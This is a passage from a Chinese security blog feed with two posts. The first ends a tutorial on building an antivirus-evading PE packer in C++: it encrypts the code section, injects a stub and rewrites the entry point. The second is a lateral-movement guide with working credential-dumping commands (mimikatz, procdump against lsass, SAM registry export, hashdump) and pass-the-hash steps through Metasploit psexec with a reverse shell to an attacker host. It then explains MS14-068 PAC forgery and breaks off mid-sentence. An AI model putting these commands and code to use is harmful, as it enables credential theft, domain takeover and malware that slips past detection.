CHAR[FileSize]&#123; 0 &#125;;</span><br><span class="line">&#x2F;&#x2F;给刚刚申请的内存读入数据</span><br><span class="line">DWORD dwRead;</span><br><span class="line">ReadFile(hFile, pFileBuf, FileSize, &amp;dwRead, NULL);</span><br><span class="line">CloseHandle(hFile);</span><br><span class="line">return pFileBuf;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="加载STUB"><a href="#加载STUB" class="headerlink" title="加载STUB"></a>加载STUB</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">void LoadStub(_In_ StubInfo* pstub) &#123;</span><br><span class="line">pstub-&gt;dllbase &#x3D; (char*)LoadLibraryEx(L&quot;F:\\stubdll.dll&quot;, NULL, DONT_RESOLVE_DLL_REFERENCES);</span><br><span class="line">pstub-&gt;pfnStart &#x3D; (DWORD)GetProcAddress((HMODULE)pstub-&gt;dllbase, &quot;Start&quot;);  &#x2F;&#x2F;获得stub的入口函数Start(自己定义在stub中的一个函数</span><br><span class="line">pstub-&gt;pStubConf &#x3D; (StubConf*)GetProcAddress((HMODULE)pstub-&gt;dllbase, &quot;g_conf&quot;);</span><br><span class="line">&#125;</span><br><span class="line">&#x2F;&#x2F;不仅加载了stub，还获得了stub抛出的用于收集信息的全局结构体（g_conf,是一个stub抛出的结构体，用于获取信息，结构如下）</span><br><span class="line">typedef struct _StubConf</span><br><span class="line">&#123;</span><br><span class="line">DWORD srcOep;&#x2F;&#x2F;入口点</span><br><span class="line">DWORD textScnRVA;&#x2F;&#x2F;代码段RVA</span><br><span class="line">DWORD textScnSize;&#x2F;&#x2F;代码段的大小</span><br><span class="line">DWORD key;&#x2F;&#x2F;解密密钥</span><br><span class="line">&#125;StubConf;</span><br></pre></td></tr></table></figure><h4 id="加密代码段"><a href="#加密代码段" class="headerlink" title="加密代码段"></a>加密代码段</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">DWORD textRVA &#x3D; GetSecByName(PeHmoudle, &quot;.text&quot;)-&gt;VirtualAddress;</span><br><span class="line">DWORD textSize &#x3D; GetSecByName(PeHmoudle, &quot;.text&quot;)-&gt;Misc.VirtualSize;</span><br><span class="line">Encry(PeHmoudle,pstub);</span><br><span class="line">void Encry(_In_ char* hpe,_In_ StubInfo pstub) &#123;</span><br><span class="line">&#x2F;&#x2F;获取代码段首地址</span><br><span class="line">BYTE* TargetText &#x3D; GetSecByName(hpe, &quot;.text&quot;)-&gt;PointerToRawData + (BYTE*)hpe;</span><br><span class="line">&#x2F;&#x2F;获取代码段大小</span><br><span class="line">DWORD TargetTextSize &#x3D; GetSecByName(hpe, &quot;.text&quot;)-&gt;Misc.VirtualSize;</span><br><span class="line">&#x2F;&#x2F;加密代码段</span><br><span class="line">for (int i &#x3D; 0; i &lt; TargetTextSize; i++) &#123;</span><br><span class="line">TargetText[i] ^&#x3D; 0x15;</span><br><span class="line">&#125;</span><br><span class="line">pstub.pStubConf-&gt;textScnRVA &#x3D; GetSecByName(hpe, &quot;.text&quot;)-&gt;VirtualAddress;</span><br><span class="line">pstub.pStubConf-&gt;textScnSize &#x3D; TargetTextSize;</span><br><span class="line">pstub.pStubConf-&gt;key &#x3D; 0x15;</span><br><span class="line">&#125;</span><br><span class="line">&#x2F;&#x2F;加密代码段，并给予了stub一些信息</span><br></pre></td></tr></table></figure><h4 id="添加新区段"><a href="#添加新区段" class="headerlink" title="添加新区段"></a>添加新区段</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">char* AddSec(_In_ char*&amp; hpe, _In_ DWORD&amp; filesize, _In_ const char* secname, _In_ const int secsize) &#123;</span><br><span class="line">GetFileHeader(hpe)-&gt;NumberOfSections++;</span><br><span class="line">PIMAGE_SECTION_HEADER pesec &#x3D; GetLastSec(hpe);</span><br><span class="line">&#x2F;&#x2F;设置区段表属性</span><br><span class="line">memcpy(pesec-&gt;Name, secname, 8);</span><br><span class="line">pesec-&gt;Misc.VirtualSize &#x3D; secsize;</span><br><span class="line">pesec-&gt;VirtualAddress &#x3D; (pesec - 1)-&gt;VirtualAddress + AlignMent((pesec - 1)-&gt;SizeOfRawData,GetOptHeader(hpe)-&gt;SectionAlignment);</span><br><span class="line">pesec-&gt;SizeOfRawData &#x3D; AlignMent(secsize, GetOptHeader(hpe)-&gt;FileAlignment);</span><br><span class="line">pesec-&gt;PointerToRawData &#x3D; AlignMent(filesize,GetOptHeader(hpe)-&gt;FileAlignment);</span><br><span class="line">pesec-&gt;Characteristics &#x3D; 0xE00000E0;</span><br><span class="line">&#x2F;&#x2F;设置OPT头映像大小</span><br><span class="line">GetOptHeader(hpe)-&gt;SizeOfImage &#x3D; pesec-&gt;VirtualAddress + pesec-&gt;SizeOfRawData;</span><br><span class="line">&#x2F;&#x2F;扩充文件数据</span><br><span class="line">int newSize &#x3D; pesec-&gt;PointerToRawData + pesec-&gt;SizeOfRawData;</span><br><span class="line">char* nhpe &#x3D; new char [newSize] &#123;0&#125;;</span><br><span class="line">&#x2F;&#x2F;向新缓冲区录入数据</span><br><span class="line">memcpy(nhpe, hpe, filesize);</span><br><span class="line">&#x2F;&#x2F;缓存区更替</span><br><span class="line">delete hpe;</span><br><span class="line">filesize &#x3D; newSize;</span><br><span class="line">return nhpe;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="stub重定位"><a href="#stub重定位" class="headerlink" title="stub重定位"></a>stub重定位</h4><p>好家伙，这个东西稍有不慎就会让整个程序拉跨掉（过来人的忠告<br>为什么需要stub重定位呢？因为我们的stub最开始是加载在内存中的，它的许多指令如跳转到的地址是按内存为基准确定的，但是我们需要把他移植进文件，所以它的代码里许多地址就是错误的，我们需要对这些地址进行处理，即重定位，使其以宿主程序为标准进行地址修复。<br>可能我表述的不是很清楚😥举个例子吧，比如stub在加载进内存时，有一条跳转指令时jmp 12345678, 如果我们不处理就把这条指令移植进PE文件，那么PE文件执行到此处时就会跳转到12345678，此时的12345678地址可能就已经不是PE文件加载的内存区间了，从而程序会崩溃。所以要修复。根据stub的重定位表进行修复。<br>重定位表就是记录哪些地址的数据需要被修复的，我们遍历这些地址进行修复即可。<br>如果以下代码看起来吃力，可以先去了解一下重定位表</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">void FixStub(DWORD targetDllbase, DWORD stubDllbase,DWORD targetNewScnRva,DWORD stubTextRva )</span><br><span class="line">&#123;</span><br><span class="line">&#x2F;&#x2F;找到stub.dll的重定位表</span><br><span class="line">DWORD dwRelRva &#x3D; GetOptHeader((char*)stubDllbase)-&gt;DataDirectory[5].VirtualAddress;</span><br><span class="line">IMAGE_BASE_RELOCATION* pRel &#x3D; (IMAGE_BASE_RELOCATION*)(dwRelRva + stubDllbase);</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;遍历重定位表</span><br><span class="line">while (pRel-&gt;SizeOfBlock)</span><br><span class="line">&#123;</span><br><span class="line">struct TypeOffset</span><br><span class="line">&#123;</span><br><span class="line">WORD offset : 12;</span><br><span class="line">WORD type : 4;</span><br><span class="line"></span><br><span class="line">&#125;;</span><br><span class="line">TypeOffset* pTypeOffset &#x3D; (TypeOffset*)(pRel + 1);</span><br><span class="line">DWORD dwCount &#x3D; (pRel-&gt;SizeOfBlock - 8) &#x2F; 2;&#x2F;&#x2F;需要重定位的数量</span><br><span class="line">for (int i &#x3D; 0; i &lt; dwCount; i++)</span><br><span class="line">&#123;</span><br><span class="line">if (pTypeOffset[i].type !&#x3D; 3)</span><br><span class="line">&#123;</span><br><span class="line">continue;</span><br><span class="line">&#125;</span><br><span class="line">&#x2F;&#x2F;需要重定位的地址</span><br><span class="line">DWORD* pFixAddr &#x3D; (DWORD*)(pRel-&gt;VirtualAddress + pTypeOffset[i].offset + stubDllbase);</span><br><span class="line"></span><br><span class="line">DWORD dwOld;</span><br><span class="line">&#x2F;&#x2F;修改属性为可写</span><br><span class="line">VirtualProtect(pFixAddr, 4, PAGE_READWRITE, &amp;dwOld);</span><br><span class="line">&#x2F;&#x2F;去掉dll当前加载基址</span><br><span class="line">*pFixAddr -&#x3D; stubDllbase;</span><br><span class="line">&#x2F;&#x2F;去掉默认的段首RVA</span><br><span class="line">*pFixAddr -&#x3D; stubTextRva;</span><br><span class="line">&#x2F;&#x2F;换上目标文件的加载基址</span><br><span class="line">*pFixAddr +&#x3D; targetDllbase;</span><br><span class="line">&#x2F;&#x2F;加上新区段的段首RVA</span><br><span class="line">*pFixAddr +&#x3D; targetNewScnRva;</span><br><span class="line">&#x2F;&#x2F;把属性修改回去</span><br><span class="line">VirtualProtect(pFixAddr, 4, dwOld, &amp;dwOld);</span><br><span class="line">&#125;</span><br><span class="line">&#x2F;&#x2F;切换到下一个重定位块</span><br><span class="line">pRel &#x3D; (IMAGE_BASE_RELOCATION*)((DWORD)pRel + pRel-&gt;SizeOfBlock);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="stub移植"><a href="#stub移植" class="headerlink" title="stub移植"></a>stub移植</h4><p>这个简单，没啥说的</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">memcpy(GetLastSec(PeNewHmoudle)-&gt;PointerToRawData+ PeNewHmoudle,</span><br><span class="line">GetSecByName(pstub.dllbase, &quot;.text&quot;)-&gt;VirtualAddress+pstub.dllbase,</span><br><span class="line">GetSecByName(pstub.dllbase,&quot;.text&quot;)-&gt;Misc.VirtualSize);</span><br></pre></td></tr></table></figure><h4 id="入口点修改"><a href="#入口点修改" class="headerlink" title="入口点修改"></a>入口点修改</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">GetOptHeader(PeNewHmoudle)-&gt;AddressOfEntryPoint &#x3D;</span><br><span class="line">pstub.pfnStart-(DWORD)pstub.dllbase-GetSecByName(pstub.dllbase,&quot;.text&quot;)-&gt;VirtualAddress+GetLastSec(PeNewHmoudle)-&gt;VirtualAddress;</span><br></pre></td></tr></table></figure><h4 id="去随机基址"><a href="#去随机基址" class="headerlink" title="去随机基址"></a>去随机基址</h4><p>不去掉随机基址，加载基址就是不固定的，不方便操作</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">GetOptHeader(PeNewHmoudle)-&gt;DllCharacteristics &amp;&#x3D; (~0x40);</span><br></pre></td></tr></table></figure><h4 id="保存文件"><a href="#保存文件" class="headerlink" title="保存文件"></a>保存文件</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">void SaveFile(_In_ const char* path, _In_ const char* data, _In_ int FileSize) &#123;</span><br><span class="line">HANDLE hFile &#x3D; CreateFileA(</span><br><span class="line">path,</span><br><span class="line">GENERIC_WRITE,</span><br><span class="line">FILE_SHARE_READ,</span><br><span class="line">NULL,</span><br><span class="line">CREATE_ALWAYS,</span><br><span class="line">FILE_ATTRIBUTE_NORMAL,</span><br><span class="line">NULL</span><br><span class="line">);</span><br><span class="line">DWORD Buf &#x3D; 0;</span><br><span class="line">WriteFile(hFile, data, FileSize, &amp;Buf,NULL);</span><br><span class="line">CloseHandle(hFile);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>第一次搞底层的玩意儿，导致调试这东西花了我不少时间。。<br>不过学的还是？蛮多的？<br>动态调试，c++，汇编，PE结构，动态寻址都学到了些。（怎么感觉在往逆向走了2333<br>继续弄吧，这个项目目前还有bug，等以后来了兴趣再继续添加更多更牛逼的机制。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;参考:&lt;a href=&quot;https://blog.csdn.net/qq_31507523/article/details/89438410&quot;&gt;https://blog.csdn.net/qq_31507523/article/details/89438410&lt;/a&gt;&lt;/p</summary>
      
    
    
    
    
    <category term="免杀" scheme="http://const27.com/tags/%E5%85%8D%E6%9D%80/"/>
    
  </entry>
  
  <entry>
    <title>横向移动与域控权限维持方法总汇</title>
    <link href="http://const27.com/2021/02/19/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E4%B8%8E%E5%9F%9F%E6%8E%A7%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%96%B9%E6%B3%95%E6%80%BB%E6%B1%87/"/>
    <id>http://const27.com/2021/02/19/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E4%B8%8E%E5%9F%9F%E6%8E%A7%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%96%B9%E6%B3%95%E6%80%BB%E6%B1%87/</id>
    <published>2021-02-19T09:21:53.673Z</published>
    <updated>2021-02-26T12:51:39.234Z</updated>
    
    <content type="html"><![CDATA[<h1 id="横向移动"><a href="#横向移动" class="headerlink" title="横向移动"></a>横向移动</h1><h2 id="PTH"><a href="#PTH" class="headerlink" title="PTH"></a>PTH</h2><p>如果找到了某个用户的ntlm hash，就可以拿这个ntlm hash当作凭证进行远程登陆了<br>其中若hash加密方式是 rc4 ，那么就是pass the hash<br>若加密方式是aes key,那么就是pass the key<br>注意NTLM和kerberos协议均存在PTH:<br>NTLM自然不用多说<br>kerberos协议也是基于用户的client hash开始一步步认证的，自然也会受PTH影响</p><p>那前提就是要获取hash值了</p><h3 id="HASH获取"><a href="#HASH获取" class="headerlink" title="HASH获取"></a>HASH获取</h3><p>1.使用meterpreter里的mimikatz模块</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">meterpreter&gt;load mimikatz</span><br><span class="line">meterpreter&gt;mimikatz_command -f mimikatz的指令</span><br><span class="line">privilege::debug 提权  samdump::hashes dump哈希  </span><br><span class="line">或者</span><br><span class="line">meterpreter&gt;msv&#x2F;kerberos&#x2F;widgst</span><br></pre></td></tr></table></figure><p>2.使用meterpreter自带的hash获取模块</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">meterpreter&gt;hashdump</span><br><span class="line">meterpreter&gt;run windows&#x2F;gather&#x2F;smart_hashdump   (推荐使用这个)</span><br></pre></td></tr></table></figure><p>3.向目标机上传mimikatz远程调用mimikatz.exe dump出hash，mimikatz需要免杀处理<br>意思就是既然我们获取到了shell，我们直接向目标机上传一个mimikatz然后在shell里使用它就行了. 使用方法为cmd窗口打开mimikatz.exe，进入mimikatz终端，然后输入mimikatz指令即可</p><p>4.上传procdump到目标机，获取到lsass.dmp文件后将其传回本地又mimikatz来dump哈希</p><p>procdump.exe是微软自带的程序，所以不会触发杀毒。所以可以通过它传回lsass.dmp本地提取hash</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">procdump64.exe -accepteula -ma lsass.exe lsass.dmp  执行该指令，获取到lsass.dmp</span><br><span class="line">然后将其传回本地</span><br><span class="line">通过mimikatz.exe分别执行以下命令</span><br><span class="line">&quot;sekurlsa::minidump lsass.dmp&quot; &quot;sekurlsa::logonPasswords full&quot;</span><br></pre></td></tr></table></figure><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217130719.png" alt="QQ截图20210217130719"></p><p><a href="https://docs.microsoft.com/zh-cn/sysinternals/downloads/procdump">Procdump</a>：<a href="https://docs.microsoft.com/zh-cn/sysinternals/downloads/procdump">https://docs.microsoft.com/zh-cn/sysinternals/downloads/procdump</a><br><a href="https://github.com/gentilkiwi/mimikatz/releases">mimikatz</a>：<a href="https://github.com/gentilkiwi/mimikatz/releases">https://github.com/gentilkiwi/mimikatz/releases</a></p><p>5.使用cobalt strike 获取hash</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">beacon&gt;hashdump</span><br><span class="line">beacon&gt;mimikatz mimikatz指令</span><br></pre></td></tr></table></figure><p>6.利用sam表</p><p>mimikatz在线读sam表中的hash</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">token::elevate</span><br><span class="line">lsadump::sam</span><br></pre></td></tr></table></figure><p>将sam表下载到本地由mimikatz分析</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">reg save HKLM\SYSTEM SYSTEM</span><br><span class="line">reg save HKLM\SAM SAM</span><br><span class="line">在远端shell使用以上命令导出SYSTEM 和 SAM文件，并将其待会本地，由mimikatz分析</span><br><span class="line">mimikatz运行</span><br><span class="line">mimikatz # lsadump::sam &#x2F;sam:SAM &#x2F;system:SYSTEM</span><br><span class="line">Domain : STU1</span><br><span class="line">SysKey : fd4639f4e27c79683ae9fee56b44393f</span><br><span class="line">Local SID : S-1-5-21-1982601180-2087634876-2293013296</span><br><span class="line"></span><br><span class="line">SAMKey : 099d1915db1b0e5cf41f1f0908dc7e17</span><br><span class="line"></span><br><span class="line">RID  : 000001f4 (500)</span><br><span class="line">User : Administrator</span><br><span class="line">  Hash NTLM: 31d6cfe0d16ae931b73c59d7e0c089c0</span><br><span class="line"></span><br><span class="line">RID  : 000001f5 (501)</span><br><span class="line">User : Guest</span><br><span class="line"></span><br><span class="line">RID  : 000003e8 (1000)</span><br><span class="line">User : liukaifeng01</span><br><span class="line">  Hash NTLM: 31d6cfe0d16ae931b73c59d7e0c089c0</span><br></pre></td></tr></table></figure><h3 id="hash-传递攻击-PTH-（Pass-the-Hash"><a href="#hash-传递攻击-PTH-（Pass-the-Hash" class="headerlink" title="hash 传递攻击 PTH （Pass the Hash)"></a>hash 传递攻击 PTH （Pass the Hash)</h3><p>1.msf里使用psexec模块</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msf5 exploit(multi&#x2F;handler) &gt; use exploit&#x2F;windows&#x2F;smb&#x2F;psexec  &#x2F;&#x2F;以root启动msf</span><br><span class="line">[*] No payload configured, defaulting to windows&#x2F;meterpreter&#x2F;reverse_tcp</span><br><span class="line">msf5 exploit(windows&#x2F;smb&#x2F;psexec) &gt; set lhsot 192.168.64.133</span><br><span class="line">lhsot &#x3D;&gt; 192.168.64.133</span><br><span class="line">msf5 exploit(windows&#x2F;smb&#x2F;psexec) &gt; set lhost 192.168.64.133</span><br><span class="line">lhost &#x3D;&gt; 192.168.64.133</span><br><span class="line">msf5 exploit(windows&#x2F;smb&#x2F;psexec) &gt; set lport 443</span><br><span class="line">lport &#x3D;&gt; 443</span><br><span class="line">msf5 exploit(windows&#x2F;smb&#x2F;psexec) &gt; set rhost 192.168.52.138</span><br><span class="line">rhost &#x3D;&gt; 192.168.52.138</span><br><span class="line">msf5 exploit(windows&#x2F;smb&#x2F;psexec) &gt; set SMBUser Administrator</span><br><span class="line">SMBUser &#x3D;&gt; Administrator</span><br><span class="line">msf5 exploit(windows&#x2F;smb&#x2F;psexec) &gt; set SMBPass 8a963371a63944419ec1adf687bb1be5  &#x2F;&#x2F;一般选择NTLM HASH</span><br><span class="line">SMBPass &#x3D;&gt; 8a963371a63944419ec1adf687bb1be5</span><br><span class="line">msf5 exploit(windows&#x2F;smb&#x2F;psexec) &gt; run</span><br></pre></td></tr></table></figure><p>2.使用mimikatz</p><p>我们在目标机里放置mimikatz.exe 然后执行以下命令</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sekurlsa::pth &#x2F;user:administrator &#x2F;domain:&quot;xxx.com&quot; &#x2F;ntlm:6542d35ed5ff6ae5e75b875068c5d3bc  &#x2F;&#x2F;自行修改</span><br></pre></td></tr></table></figure><p>之后便会弹出一个cmd窗口，在这个窗口里链接机器即可</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">net use \\192.168.222.131\c$</span><br></pre></td></tr></table></figure><p>3.使用cobalt strike</p><p>在cobalt strike里找到域控，然后使用psexec模块，选择一个本地hash即可。</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217130746.png" alt="QQ截图20210217130746"></p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217130806.png" alt="QQ截图20210217130806"></p><h2 id="MS14-068"><a href="#MS14-068" class="headerlink" title="MS14-068"></a>MS14-068</h2><p>这个洞的危害很大，可以让任意域用户提权到域管。<br>适用版本: server 2000以上<br>补丁: kb3011780</p><h3 id="PAC"><a href="#PAC" class="headerlink" title="PAC"></a>PAC</h3><p>PAC是kerberos协议里用来解决用户权限功能所设计出的东西。<br>在kerberos协议里面，一个用户用自己的hash拿到了TGT，接着凭借着TGT拿到了TGS，接着用TGS去访问服务。看似只要hash正确，用户就能到处访问服务，但是所有服务都可以给这个用户所访问吗？肯定是不行的，所以微软在kerberos为了实现用户权限分级，采用了PAC。<br>PAC被设计为存在于TGT里面。完整的kerberos权限验证流程如下。</p><p>1。用户凭借自己的hash加密时间戳并发送明文用户名到KDC，KDC认证用户成功后返回被krbtgt用户hash加密的TGT(内有ticekt包含着PAC)，以及用户自身hash加密的login session key</p><p>2.用户凭借TGT票据向KDC发起指定服务的TGS_REQ。KDC用krbtgt hash解密，若解密成功则直接返回服务hash加密的TGS（这里并没考虑用户的权限，直接返回了TGS）</p><p>3.用户用TGS向服务发起请求，服务用自己的hash解密TGS后获得PAC，拿着PAC向KDC询问该用户是否有权限访问。KDC拿到PAC后再次解密，得到了PAC里的 用户的sid，以及所在的组，再判断用户是否有访问服务的权限（有些服务不会验证KDC，这样就会导致白银票据攻击)</p><p>PAC自身的结构</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217131035.png" alt="QQ截图20210217131035"></p><p>PAC在Ticket中的结构</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217131108.png" alt="QQ截图20210217131108"></p><p>又这个图可以知道,PAC只不过是ticket里Authorization DATA的一个分支。<br>而Authorization data的结构是这样的</p><p>AuthorizationData    ::= SEQUENCE OF SEQUENCE {<br>ad-type     [0] Int32,<br>ad-data     [1] OCTET STRING }</p><p>ad-type中就有这么一个类型 AD-IF-RELEVANT 对应数字1,由上上图可知这是PAC的外壳。<br>若类型为 AD-IF-RELEVAN ,那么ad-data也是一个 AuthorizationData类型的结构体，也有ad-type 和ad-data.那么这个外壳ad-data的ad-type就是次外壳AD-WIN2K-PAC 了,与 AD-WIN2K-PAC 这个ad-type对应的ad-data就是一段连续空间。 这段空间包含一个头部PACTYPE以及若干个PAC_INFO_BUFFER 。<br>PACTYPE包含的是 cBuffers,版本以及缓冲区 。<br>PAC_INFO_BUFFER是key-value型的。PAC_INFO_BUFFER的key有很多</p><table><thead><tr><th>0x00000001</th><th>登录信息。PAC结构必须包含一个这种类型的缓冲区。其他登录信息缓冲区必须被忽略。</th></tr></thead><tbody><tr><td>0x00000002</td><td>凭证信息。PAC结构不应包含多个此类缓冲区。第二或后续凭证信息缓冲区在接收时必须被忽略。</td></tr><tr><td>0x00000006</td><td>服务器校验和。PAC结构必须包含一个这种类型的缓冲区。其他登录服务器校验和缓冲区必须被忽略。</td></tr><tr><td>0x00000007</td><td>KDC（特权服务器）校验和（第2.8节）。PAC结构必须包含一个这种类型的缓冲区。附加的KDC校验和缓冲区必须被忽略。</td></tr><tr><td>0x0000000A</td><td>客户名称和票证信息。PAC结构必须包含一个这种类型的缓冲区。附加的客户和票据信息缓冲区必须被忽略。</td></tr><tr><td>0x0000000B</td><td>受约束的委派信息。PAC结构必须包含一个S4U2proxy请求的此类缓冲区，否则不包含。附加的受约束的委托信息缓冲区必须被忽略。</td></tr><tr><td>0x0000000C</td><td>用户主体名称（UPN）和域名系统（DNS）信息。PAC结构不应包含多个这种类型的缓冲区。接收时必须忽略第二个或后续的UPN和DNS信息缓冲区。</td></tr><tr><td>0x0000000D</td><td>客户索取信息。PAC结构不应包含多个这种类型的缓冲区。附加的客户要求信息缓冲区必须被忽略。</td></tr><tr><td>0x0000000E</td><td>设备信息。PAC结构不应包含多个这种类型的缓冲区。附加的设备信息缓冲区必须被忽略。</td></tr><tr><td>0x0000000F</td><td>设备声明信息。PAC结构不应包含多个这种类型的缓冲区。附加的设备声明信息缓冲区必须被忽略。</td></tr></tbody></table><p>其中比较重要的是1,6和7</p><p><strong>0x00000001 KERBVALIDATIONINFO</strong> 这个结构用于存储用户的身份信息.它是一个结构体，这个结构体是这样的(待会我们伪造PAC的时候主要就是伪造此处额 UserId 以及 PGROUP_MEMBERSHIP GroupIds ）服务器解包PAC后提取用户的sid以及groupid，然后就把当前发包过来的用户权限当成sid，groupid的权限处理。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">typedef struct _KERB_VALIDATION_INFO &#123;</span><br><span class="line">FILETIME LogonTime;</span><br><span class="line">FILETIME LogoffTime;</span><br><span class="line">FILETIME KickOffTime;</span><br><span class="line">FILETIME PasswordLastSet;</span><br><span class="line">FILETIME PasswordCanChange;</span><br><span class="line">FILETIME PasswordMustChange;</span><br><span class="line">RPC_UNICODE_STRING EffectiveName;</span><br><span class="line">RPC_UNICODE_STRING FullName;</span><br><span class="line">RPC_UNICODE_STRING LogonScript;</span><br><span class="line">RPC_UNICODE_STRING ProfilePath;</span><br><span class="line">RPC_UNICODE_STRING HomeDirectory;</span><br><span class="line">RPC_UNICODE_STRING HomeDirectoryDrive;</span><br><span class="line">USHORT LogonCount;</span><br><span class="line">USHORT BadPasswordCount;</span><br><span class="line">ULONG UserId; &#x2F;&#x2F;用户的sid</span><br><span class="line">ULONG PrimaryGroupId;</span><br><span class="line">ULONG GroupCount;</span><br><span class="line">[size_is(GroupCount)] PGROUP_MEMBERSHIP GroupIds;&#x2F;&#x2F;用户所在的组，如果我们可以篡改的这个的话，添加一个500(域管组)，那用户就是域管了。在ms14068 PAC签名被绕过，用户可以自己制作PAC的情况底下，pykek就是靠向这个地方写进域管组，成为使得改用户变成域管</span><br><span class="line">ULONG UserFlags;</span><br><span class="line">USER_SESSION_KEY UserSessionKey;</span><br><span class="line">RPC_UNICODE_STRING LogonServer;</span><br><span class="line">RPC_UNICODE_STRING LogonDomainName;</span><br><span class="line">PISID LogonDomainId;</span><br><span class="line">ULONG Reserved1[2];</span><br><span class="line">ULONG UserAccountControl;</span><br><span class="line">ULONG SubAuthStatus;</span><br><span class="line">FILETIME LastSuccessfulILogon;</span><br><span class="line">FILETIME LastFailedILogon;</span><br><span class="line">ULONG FailedILogonCount;</span><br><span class="line">ULONG Reserved3;</span><br><span class="line">ULONG SidCount;</span><br><span class="line">[size_is(SidCount)] PKERB_SID_AND_ATTRIBUTES ExtraSids;</span><br><span class="line">PISID ResourceGroupDomainSid;</span><br><span class="line">ULONG ResourceGroupCount;</span><br><span class="line">[size_is(ResourceGroupCount)] PGROUP_MEMBERSHIP ResourceGroupIds;</span><br><span class="line">&#125; KERB_VALIDATION_INFO;</span><br></pre></td></tr></table></figure><p><strong>0x00000006和0x00000007</strong> 6是服务器校验和，由server密码加密。7是KDC校验和，又KDC密码加密。存在的目的就是防止PAC被篡改。</p><h3 id="MS14068"><a href="#MS14068" class="headerlink" title="MS14068"></a>MS14068</h3><p>这个漏洞的产生主要是微软犯下了三个错误：<br>1.对校验和的算法实现不够细致，导致在校验和生成时可以不用管server和KDC的hash直接生成，而且生成出来的校验和还是合法的<br>2.PAC可以不用放在TGT中，即使是这样，KDC也能照常解析出TGT外的PAC<br>3.下面再说</p><p>那么这个漏洞大致的攻击原理是什么呢。<br>首先，我们在as_request的时候，把include-PAC标志设置为false，那么as_rep就不会在TGT中返回PAC了。然后这个时候我们自己伪造一个pac，在TGS_REQ时发过去就行了。伪造的pac修改USER SID&amp;GROUP SID(在PAC的 <strong>0x00000001 KERBVALIDATIONINFO</strong> 结构)可以把我们的用户权限改到很高（域管），从而达到提权到域管的能力。</p><p>那么伪造PAC，我们就遇到了两个问题：<br>1.pac里有校验和，防止自己被篡改，我们得有server和KDC密码才能使校验和合法。<br>2.pac按理说应该在TGT里，但是TGT是被kbrtgt hash加密的，我们无法获取kbrtgt hash继而无法修改TGT内容，继而不能修改PAC。</p><p>来说说如何绕过PAC校验和问题。<br>我们刚刚说过，<strong>0x00000006和0x00000007</strong> 这两个结构的存在是为了防止PAC被篡改，这个校验和算法采用的是个叫checksum算法然后把kdc hash和服务hash当作key对PAC加密产生的值，从而防止PAC被篡改。但是checksum算法是有很多种的，md5也是checksum的分支之一，修改PAC后，我们只需设置加密算法为MD5并用MD5算法对<strong>0x00000001 KERBVALIDATIONINFO</strong>进行加密，将生成的值放入两个检验和即可，KDC拿到<strong>0x00000001 KERBVALIDATIONINFO</strong>，并且通过解析数据包获取当前加密算法为MD5，然后对其进行MD5加密，若加密结果与校验和一致，则认为PAC未被修改</p><p>再来说说如何绕过krbtgt hash加密TGT的问题。<br>因为我们在AS_REQ时设置include-PAC为false，TGT里就不会包含PAC了。那么我们在TGS_REQ时如何把PAC传递给KDC？只需要把PAC放入req-body即可。<br>这样KDC依旧会正常解析这个TGS_REQ包</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217132156.png" alt="QQ截图20210217132156"></p><p>注意TGS_REQ里的include-pac依旧是false。<br><strong>然后KDC接收到PAC后会先解密TGT拿到authenticator里的key对PAC进行解密（TGS_REQ时加密PAC用的key是随机生成的，这个key会放在authenticator里），然后验证一下PAC的签名，若成功然后把解密得到的PAC采用server key和KDC key重新生成校验和，拼接成一个新的TGT返回给客户端。</strong><br>上面这一段就是微软犯下的第三个错误，很不可思议，居然莫名其妙的返回了一个包含了PAC的TGT回来。总结来说就是构造了一个畸形的TGS_REQ，从TGS_RES得到了一个包含伪造PAC的TGT。</p><p>原理就是上面这些，然后我们用包含伪造PAC的TGT到处访问服务即可。</p><h3 id="M14068利用"><a href="#M14068利用" class="headerlink" title="M14068利用"></a>M14068利用</h3><p>1.工具kekeo<a href="https://github.com/gentilkiwi/kekeo/releases/tag/2.2.0-20200718"> https://github.com/gentilkiwi/kekeo/releases/tag/2.2.0-20200718</a></p><p>具体方法为，在kekeo里先执行 